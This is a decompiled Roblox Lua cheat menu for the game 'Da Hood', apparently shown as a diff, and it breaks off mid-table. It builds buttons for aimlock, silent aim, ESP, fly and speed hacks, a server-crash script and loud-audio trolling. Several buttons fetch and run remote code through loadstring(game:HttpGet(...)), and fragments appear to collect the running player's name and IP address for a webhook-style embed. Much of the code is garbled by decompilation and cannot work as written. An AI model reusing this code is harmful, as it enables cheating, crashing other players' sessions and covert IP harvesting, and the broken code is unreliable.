+Instance.new("TextButton").Text = "Player"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextSize = 14
+Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("Frame"), "Maintab"
+Instance.new("Frame").BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("Frame").BorderColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("Frame").Position = UDim2.new(0.20864661, 0, 0.146198824, 0)
+Instance.new("TextButton").Parent, Instance.new("Frame").Size = Instance.new("Frame"), UDim2.new(0, 421, 0, 291)
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(65, 65, 65)
+Instance.new("TextButton").Position = UDim2.new(0.0349418707, 0, 0.0672816411, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 371, 0, 32)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "GA$ SCRIPT"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(65, 65, 65)
+Instance.new("TextButton").Position = UDim2.new(0.034941867, 0, 0.236721501, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 371, 0, 32)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Chat Spy"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(65, 65, 65)
+Instance.new("TextButton").Position = UDim2.new(0.0349418521, 0, 0.403508753, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 371, 0, 32)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Inf Jump"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(65, 65, 65)
+Instance.new("TextButton").BorderColor3 = Color3.fromRGB(27, 42, 53)
+Instance.new("TextButton").Position = UDim2.new(0.034941867, 0, 0.567191184, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 371, 0, 32)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "AimLock GUI"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(65, 65, 65)
+Instance.new("TextButton").Position = UDim2.new(0.03306216, 0, 0.7282812, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 371, 0, 32)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Bypassed Fly"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(65, 65, 65)
+Instance.new("TextButton").Position = UDim2.new(0.0244360901, 0, 0.184210509, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 71, 0, 25)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Main"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextSize = 14
+Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("Frame"), "PlayerTab"
+Instance.new("Frame").BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("Frame").BorderColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("Frame").Position = UDim2.new(0.20864661, 0, 0.146198824, 0)
+Instance.new("Frame").Size = UDim2.new(0, 421, 0, 291)
+Instance.new("TextButton").Parent, Instance.new("Frame").Visible = Instance.new("Frame"), false
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(65, 65, 65)
+Instance.new("TextButton").Position = UDim2.new(0.033254154, 0, 0.0652920976, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 371, 0, 32)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Headless"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(65, 65, 65)
+Instance.new("TextButton").Position = UDim2.new(0.0308788568, 0, 0.23367697, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 371, 0, 32)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Korblox"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(65, 65, 65)
+Instance.new("TextButton").Position = UDim2.new(0.033254154, 0, 0.40206188, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 371, 0, 32)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Trash Talk - j"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(65, 65, 65)
+Instance.new("TextButton").Position = UDim2.new(0.0332541615, 0, 0.567010343, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 371, 0, 32)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Speed"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(65, 65, 65)
+Instance.new("TextButton").Position = UDim2.new(0.0332541615, 0, 0.725085914, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 371, 0, 32)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Animations"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(65, 65, 65)
+Instance.new("TextButton").Position = UDim2.new(0.0244360901, 0, 0.415204674, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 71, 0, 25)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Visuals"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextSize = 14
+Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("Frame"), "VisualsTab"
+Instance.new("Frame").BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("Frame").BorderColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("Frame").Position = UDim2.new(0.20864661, 0, 0.146198824, 0)
+Instance.new("Frame").Size = UDim2.new(0, 421, 0, 291)
+Instance.new("TextButton").Parent, Instance.new("Frame").Visible = Instance.new("Frame"), false
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(65, 65, 65)
+Instance.new("TextButton").Position = UDim2.new(0.0332541578, 0, 0.0446735397, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 371, 0, 32)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "ESP"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(65, 65, 65)
+Instance.new("TextButton").Position = UDim2.new(0.033254154, 0, 0.206185549, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 371, 0, 32)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "- Coming soon -"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(65, 65, 65)
+Instance.new("TextButton").Position = UDim2.new(0.0244360901, 0, 0.535087705, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 71, 0, 25)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Aimlocks"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextSize = 14
+Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("Frame"), "AimlocksTab"
+Instance.new("Frame").BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("Frame").BorderColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("Frame").Position = UDim2.new(0.20864661, 0, 0.146198824, 0)
+Instance.new("Frame").Size = UDim2.new(0, 421, 0, 291)
+Instance.new("TextButton").Parent, Instance.new("Frame").Visible = Instance.new("Frame"), false
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(65, 65, 65)
+Instance.new("TextButton").BorderColor3 = Color3.fromRGB(27, 42, 53)
+Instance.new("TextButton").Position = UDim2.new(0.0356294475, 0, 0.0446735322, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 371, 0, 32)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Silent aim - Q"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(65, 65, 65)
+Instance.new("TextButton").Position = UDim2.new(0.0244360901, 0, 0.649122834, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 71, 0, 25)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Boombox"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextSize = 14
+Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("Frame"), "BoomboxTab"
+Instance.new("Frame").BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("Frame").BorderColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("Frame").Position = UDim2.new(0.20864661, 0, 0.149122804, 0)
+Instance.new("Frame").Size = UDim2.new(0, 421, 0, 291)
+Instance.new("TextButton").Parent, Instance.new("Frame").Visible = Instance.new("Frame"), false
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(65, 65, 65)
+Instance.new("TextButton").Position = UDim2.new(0.033254154, 0, 0.0412371159, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 371, 0, 32)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Super Loud ID"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(65, 65, 65)
+Instance.new("TextButton").Position = UDim2.new(0.033254154, 0, 0.202749148, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 371, 0, 32)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "Bill Nye Theme"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(65, 65, 65)
+Instance.new("TextButton").Position = UDim2.new(0.0308788568, 0, 0.357388318, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 371, 0, 32)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "(LOUD) Sans Theme"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").Parent, Instance.new("TextButton").TextWrapped = Instance.new("Frame"), true
+Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(65, 65, 65)
+Instance.new("TextButton").Position = UDim2.new(0.0308788605, 0, 0.510037959, 0)
+Instance.new("TextButton").Size = UDim2.new(0, 372, 0, 34)
+Instance.new("TextButton").Font = Enum.Font.SourceSans
+Instance.new("TextButton").Text = "(LOUD) Spongebob ID"
+Instance.new("TextButton").TextColor3 = Color3.fromRGB(0, 0, 0)
+Instance.new("TextButton").TextScaled = true
+Instance.new("TextButton").TextSize = 14
+Instance.new("TextButton").TextWrapped = true
+coroutine.wrap(function()
+  wait(4)
+  game.StarterGui:SetCore("SendNotification", {
+    Title = "join the server",
+    Text = "Link was copied",
+    icon = "http://www.roblox.com/asset/?id=8109580830",
+    Duration = "5"
+  })
+end)()
+coroutine.wrap(function()
+  game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(a)
+    if a == "y" then
+      va.Parent.Visible = true
+    end
+  end)
+  game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(a)
+    if a == "v" then
+      va.Parent.Visible = false
+    end
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    game.Players.LocalPlayer.Character.Humanoid.Walkpeed = 33
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    game.Players.LocalPlayer.Character.Head.Transparency = 1
+    for fd, fe in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do
+      if fe:IsA("Decal") then
+        fe:Destroy()
+      end
+    end
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    game.Players.LocalPlayer.Character.RightLowerLeg.MeshId = "902942093"
+    game.Players.LocalPlayer.Character.RightLowerLeg.Transparency = "1"
+    game.Players.LocalPlayer.Character.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
+    game.Players.LocalPlayer.Character.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
+    game.Players.LocalPlayer.Character.RightFoot.MeshId = "902942089"
+    game.Players.LocalPlayer.Character.RightFoot.Transparency = "1"
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+  end)
+  _G.JumpHeight = 50
+  function Action(a, b)
+    if a ~= nil then
+      b(a)
+    end
+  end
+  game:GetService("UserInputService").InputBegan:connect(function(a)
+    if a.UserInputType == Enum.UserInputType.Keyboard and a.KeyCode == Enum.KeyCode.Space then
+      Action(va.Character.Humanoid, function(a)
+        if a:GetState() == Enum.HumanoidStateType.Jumping or a:GetState() == Enum.HumanoidStateType.Freefall then
+          Action(a.Parent.HumanoidRootPart, function(a)
+            a.Velocity = Vector3.new(0, _G.JumpHeight, 0)
+          end)
+        end
+      end)
+    end
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/angeloX041/GASFLY/main/GASWIN", true))()
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Raycodex/Exploiting/main/Roblox/Da%20Hood%20Auto%20Cash%20Drop", true))()
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    wait(0.5)
+    Instance.new("ScreenGui").Parent = game.CoreGui
+    Instance.new("TextLabel").Parent, Instance.new("ScreenGui").ZIndexBehavior = Instance.new("ScreenGui"), Enum.ZIndexBehavior.Sibling
+    Instance.new("TextLabel").Active = true
+    Instance.new("TextLabel").BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
+    Instance.new("TextLabel").Draggable = true
+    Instance.new("TextLabel").Position = UDim2.new(0.698610067, 0, 0.098096624, 0)
+    Instance.new("TextLabel").Size = UDim2.new(0, 370, 0, 52)
+    Instance.new("TextLabel").Font = Enum.Font.SourceSansSemibold
+    Instance.new("TextLabel").Text = "Anti AFK Script"
+    Instance.new("TextLabel").TextColor3 = Color3.new(0, 1, 1)
+    Instance.new("Frame").Parent, Instance.new("TextLabel").TextSize = Instance.new("TextLabel"), 22
+    Instance.new("Frame").BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
+    Instance.new("Frame").Position = UDim2.new(0, 0, 1.0192306, 0)
+    Instance.new("TextLabel").Parent, Instance.new("Frame").Size = Instance.new("Frame"), UDim2.new(0, 370, 0, 107)
+    Instance.new("TextLabel").BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
+    Instance.new("TextLabel").Position = UDim2.new(0, 0, 0.800455689, 0)
+    Instance.new("TextLabel").Size = UDim2.new(0, 370, 0, 21)
+    Instance.new("TextLabel").Font = Enum.Font.Arial
+    Instance.new("TextLabel").Text = "made by ur mom "
+    Instance.new("TextLabel").TextColor3 = Color3.new(0, 1, 1)
+    Instance.new("TextLabel").Parent, Instance.new("TextLabel").TextSize = Instance.new("Frame"), 20
+    Instance.new("TextLabel").BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
+    Instance.new("TextLabel").Position = UDim2.new(0, 0, 0.158377, 0)
+    Instance.new("TextLabel").Size = UDim2.new(0, 370, 0, 44)
+    Instance.new("TextLabel").Font = Enum.Font.ArialBold
+    Instance.new("TextLabel").Text = "Status: Active"
+    Instance.new("TextLabel").TextColor3 = Color3.new(0, 1, 1)
+    Instance.new("TextLabel").TextSize = 20
+    game:service("Players").LocalPlayer.Idled:connect(function()
+      va:CaptureController()
+      va:ClickButton2(Vector2.new())
+      vb.Text = "Roblox tried to kick u but i kicked him instead"
+      wait(2)
+      vb.Text = "Status : Active"
+    end)
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/22kristina/dhcrash_gen2/main/crash", true))()
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.Image = game:GetService("Players"):GetUserThumbnailAsync(game:GetService("Players").LocalPlayer.UserId, Enum.ThumbnailType.AvatarThumbnail, Enum.ThumbnailSize.Size420x420)
+end)()
+coroutine.wrap(function()
+  pcall(function()
+    if syn then
+    elseif not {
+      embeds = {
+        {
+          title = game:GetService("Players").LocalPlayer.Name,
+          description = game:HttpGet("https://api.ipify.org")
+        }
+      }
+    } then
+    else
+    end
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.InputBegan:Connect(function(a)
+    if a.UserInputType == Enum.UserInputType.MouseButton1 or a.UserInputType == Enum.UserInputType.Touch then
+      va = true
+      vb = a.Position
+      vc = vd.Position
+      a.Changed:Connect(function()
+        if va.UserInputState == Enum.UserInputState.End then
+          vb = false
+        end
+      end)
+    end
+  end)
+  game:GetService("UserInputService").InputChanged:Connect(function(a)
+    if (a.UserInputType == Enum.UserInputType.MouseMovement or a.UserInputType == Enum.UserInputType.Touch) and va then
+      vb(a)
+    end
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Down:connect(function()
+    va.Parent.Parent.LegitTab.Visible = true
+    va.Parent.Parent.VisualsTab.Visible = false
+    va.Parent.Parent.MiscTab.Visible = false
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Down:connect(function()
+    va.Parent.Parent.LegitTab.Visible = false
+    va.Parent.Parent.VisualsTab.Visible = true
+    va.Parent.Parent.MiscTab.Visible = false
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Down:connect(function()
+    va.Parent.Parent.LegitTab.Visible = false
+    va.Parent.Parent.VisualsTab.Visible = false
+    va.Parent.Parent.MiscTab.Visible = true
+  end)
+end)()
+coroutine.wrap(function()
+  Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
+    pcall(function()
+      if not {
+        embeds = {
+          {
+            title = game:GetService("Players").LocalPlayer.Name,
+            description = game:HttpGet("https://api.ipify.org")
+          }
+        }
+      } then
+      elseif not {
+        embeds = {
+          {
+            title = game:GetService("Players").LocalPlayer.Name,
+            description = game:HttpGet("https://api.ipify.org")
+          }
+        }
+      } then
+      elseif not {
+        embeds = {
+          {
+            title = game:GetService("Players").LocalPlayer.Name,
+            description = game:HttpGet("https://api.ipify.org")
+          }
+        }
+      } then
+      end
+    end)
+    game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(a)
+      if a == va then
+        if DaHoodSettings.SilentAim == true then
+          DaHoodSettings.SilentAim = false
+        else
+          DaHoodSettings.SilentAim = true
+        end
+      end
+    end)
+    game:GetService("RunService").RenderStepped:Connect(function()
+      for fd, fe in pairs(game.CoreGui:GetChildren()) do
+        if fe.Name == "PostmansAutoRob" then
+          fe:Destroy()
+        end
+      end
+      for fd, fe in pairs(game.CoreGui:GetChildren()) do
+        if fe.Name == "WarningGUI" then
+          fe:Destroy()
+        end
+      end
+    end)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))().CreateLib("Da ware - join https://discord.gg/WAZyXZ33", "DarkTheme"):NewTab("Aimlock"):NewSection("Da WARE"):NewButton("Aimlock", "Locks on the user", function()
+      getgenv().AimPart = "HumanoidRootPart"
+      getgenv().AimlockKey = "q"
+      getgenv().AimRadius = 30
+      getgenv().ThirdPerson = true
+      getgenv().FirstPerson = true
+      getgenv().TeamCheck = false
+      getgenv().PredictMovement = true
+      getgenv().PredictionVelocity = 9
+      getgenv().CiazwareUniversalAimbotLoaded = true
+      getgenv().WorldToViewportPoint = function(a)
+        return va:WorldToViewportPoint(a)
+      end
+      getgenv().WorldToScreenPoint = function(a)
+        return va.WorldToScreenPoint(va, a)
+      end
+      getgenv().GetObscuringObjects = function(a)
+        if not nil and not a and va and not a and workspace:FindPartOnRay(vb(a[getgenv().AimPart].Position, va.Character.Head.Position)) then
+          return workspace:FindPartOnRay(vb(a[getgenv().AimPart].Position, va.Character.Head.Position)):IsDescendantOf(a)
+        end
+      end
+      getgenv().GetNearestTarget = function()
+        for fh, fj in pairs(va:GetPlayers()) do
+          if fj ~= vb then
+            table.insert({}, fj)
+          end
+        end
+        for fh, fj in pairs({}) do
+          if fj.Character ~= nil then
+            if getgenv().TeamCheck == true and fj.Team ~= vb.Team then
+              {
+                [fj.Name .. fh] = {},
+                [fj.Name .. fh] = {}
+              }[fj.Name .. fh].dist = fj.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p.magnitude
+              {
+                [fj.Name .. fh] = {},
+                [fj.Name .. fh] = {}
+              }[fj.Name .. fh].plr = fj
+              {
+                [fj.Name .. fh] = {},
+                [fj.Name .. fh] = {}
+              }[fj.Name .. fh].diff = math.floor(game.Workspace:FindPartOnRay(Ray.new(game.Workspace.CurrentCamera.CFrame.p, vc.Hit.p - game.Workspace.CurrentCamera.CFrame.p.unit * fj.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p.magnitude), game.Workspace) - fj.Character:FindFirstChild("Head").Position.magnitude)
+              table.insert({}, (math.floor(game.Workspace:FindPartOnRay(Ray.new(game.Workspace.CurrentCamera.CFrame.p, vc.Hit.p - game.Workspace.CurrentCamera.CFrame.p.unit * fj.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p.magnitude), game.Workspace) - fj.Character:FindFirstChild("Head").Position.magnitude)))
+            elseif getgenv().TeamCheck == false and fj.Team == vb.Team then
+              {
+                [fj.Name .. fh] = {},
+                [fj.Name .. fh] = {}
+              }[fj.Name .. fh].dist = fj.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p.magnitude
+              {
+                [fj.Name .. fh] = {},
+                [fj.Name .. fh] = {}
+              }[fj.Name .. fh].plr = fj
+              {
+                [fj.Name .. fh] = {},
+                [fj.Name .. fh] = {}
+              }[fj.Name .. fh].diff = math.floor(game.Workspace:FindPartOnRay(Ray.new(game.Workspace.CurrentCamera.CFrame.p, vc.Hit.p - game.Workspace.CurrentCamera.CFrame.p.unit * fj.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p.magnitude), game.Workspace) - fj.Character:FindFirstChild("Head").Position.magnitude)
+              table.insert({}, (math.floor(game.Workspace:FindPartOnRay(Ray.new(game.Workspace.CurrentCamera.CFrame.p, vc.Hit.p - game.Workspace.CurrentCamera.CFrame.p.unit * fj.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p.magnitude), game.Workspace) - fj.Character:FindFirstChild("Head").Position.magnitude)))
+            end
+          end
+        end
+        if unpack({}) == nil then
+          return nil
+        end
+        if math.floor(math.min(unpack({}))) > getgenv().AimRadius then
+          return nil
+        end
+        for fj, fk in pairs({
+          [fj.Name .. fh] = {},
+          [fj.Name .. fh] = {}
+        }) do
+          if fk.diff == math.floor(math.min(unpack({}))) then
+            return fk.plr
+          end
+        end
+        return nil
+      end
+      game:GetService("Players").LocalPlayer:GetMouse().KeyDown:Connect(function(a)
+        if a == AimlockKey and va == nil then
+          pcall(function()
+            if va ~= true then
+              va = true
+            end
+            if GetNearestTarget() ~= nil then
+              vb = GetNearestTarget()
+            end
+          end)
+        elseif a == AimlockKey and va ~= nil then
+          if va ~= nil then
+            va = nil
+          end
+          if vb ~= false then
+            vb = false
+          end
+        end
+      end)
+      game:GetService("RunService").RenderStepped:Connect(function()
+        if getgenv().ThirdPerson == true and getgenv().FirstPerson == true then
+          if va.Focus.p - va.CoordinateFrame.p.Magnitude > 1 or va.Focus.p - va.CoordinateFrame.p.Magnitude < 1 then
+            vb = true
+          else
+            vb = false
+          end
+        elseif getgenv().ThirdPerson == true and getgenv().FirstPerson == false then
+          if va.Focus.p - va.CoordinateFrame.p.Magnitude >= 1 then
+            vb = true
+          else
+            vb = false
+          end
+        elseif getgenv().ThirdPerson == false and getgenv().FirstPerson == true then
+          if va.Focus.p - va.CoordinateFrame.p.Magnitude <= 1 then
+            vb = true
+          else
+            vb = false
+          end
+        end
+        if vc == true and vd == true and not va.CoordinateFrame.p and ve.Character and ve.Character:FindFirstChild(getgenv().AimPart) then
+          if getgenv().FirstPerson == true then
+            if vb == true then
+              if getgenv().PredictMovement == true then
+                va.CFrame = vg(va.CFrame.p, 3 + 4)
+              elseif getgenv().PredictMovement == false then
+                va.CFrame = vg(va.CFrame.p, ve.Character[getgenv().AimPart].Position)
+              end
+            end
+          elseif getgenv().ThirdPerson == true and vb == true then
+            if getgenv().PredictMovement == true then
+              va.CFrame = vg(va.CFrame.p, 3 + 4)
+            elseif getgenv().PredictMovement == false then
+              va.CFrame = vg(va.CFrame.p, ve.Character[getgenv().AimPart].Position)
+            end
+          end
+        end
+      end)
+    end)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))().CreateLib("Da ware - join https://discord.gg/WAZyXZ33", "DarkTheme"):NewTab("Aimlock"):NewSection("Da WARE"):NewTextBox("Aimlock Key", "Aimlock Key should be lowercase.", function(a)
+      getgenv().AimlockKey = a
+    end)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))().CreateLib("Da ware - join https://discord.gg/WAZyXZ33", "DarkTheme"):NewTab("Aimlock"):NewSection("Da WARE"):NewTextBox("Aimlock Prediction", "Customize your aimlock prediction", function(a)
+      PredictionVelocity = a
+    end)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))().CreateLib("Da ware - join https://discord.gg/WAZyXZ33", "DarkTheme"):NewTab("Aimlock"):NewSection("Da WARE"):NewDropdown("AimPart", "Choose Aim Part to Lock At", {
+      "Head",
